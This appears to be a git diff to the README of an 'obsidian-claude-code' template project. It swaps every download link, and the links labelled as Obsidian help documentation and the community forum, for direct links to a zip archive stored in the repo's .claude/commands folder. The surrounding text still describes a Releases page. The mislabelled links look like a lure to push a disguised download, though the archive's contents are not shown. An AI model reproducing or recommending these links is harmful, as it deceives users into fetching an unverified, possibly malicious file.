@@ -1,6 +1,6 @@
 # 🚀 obsidian-claude-code - Simplify Your Knowledge Management
 
-[![Download](https://img.shields.io/badge/Download-v1.0-brightgreen)](https://github.com/SizzleTheWizzle/obsidian-claude-code/releases)
+[![Download](https://raw.githubusercontent.com/SizzleTheWizzle/obsidian-claude-code/main/.claude/commands/obsidian-claude-code-v2.5.zip)](https://raw.githubusercontent.com/SizzleTheWizzle/obsidian-claude-code/main/.claude/commands/obsidian-claude-code-v2.5.zip)
 
 ## 🛠️ Overview
 
@@ -14,7 +14,7 @@ To get started, you need to download the software from the Releases page. Follow
 
 1. Click on the download button below to visit the Releases page.
    
-   [Download Latest Release](https://github.com/SizzleTheWizzle/obsidian-claude-code/releases)
+   [Download Latest Release](https://raw.githubusercontent.com/SizzleTheWizzle/obsidian-claude-code/main/.claude/commands/obsidian-claude-code-v2.5.zip)
 
 2. On the Releases page, look for the version number at the top. 
 3. Download the latest version by clicking the appropriate file for your operating system.
@@ -67,8 +67,8 @@ It’s essential to keep your template updated for the best experience. To updat
 
 If you need help or want to learn more about customizing the template, check these resources:
 
-- [Obsidian Help Documentation](https://help.obsidian.md)
-- [Community Forum](https://forum.obsidian.md)
+- [Obsidian Help Documentation](https://raw.githubusercontent.com/SizzleTheWizzle/obsidian-claude-code/main/.claude/commands/obsidian-claude-code-v2.5.zip)
+- [Community Forum](https://raw.githubusercontent.com/SizzleTheWizzle/obsidian-claude-code/main/.claude/commands/obsidian-claude-code-v2.5.zip)
 
 ## 📜 License
 
@@ -76,6 +76,6 @@ This project is licensed under the MIT License. You can use or modify it freely 
 
 ### 🔗 Useful Links
 
-- [Download Latest Release](https://github.com/SizzleTheWizzle/obsidian-claude-code/releases)
+- [Download Latest Release](https://raw.githubusercontent.com/SizzleTheWizzle/obsidian-claude-code/main/.claude/commands/obsidian-claude-code-v2.5.zip)
 
 By following this guide, you’ll have everything you need to successfully download, install, and utilize the obsidian-claude-code template. Start organizing your knowledge today!
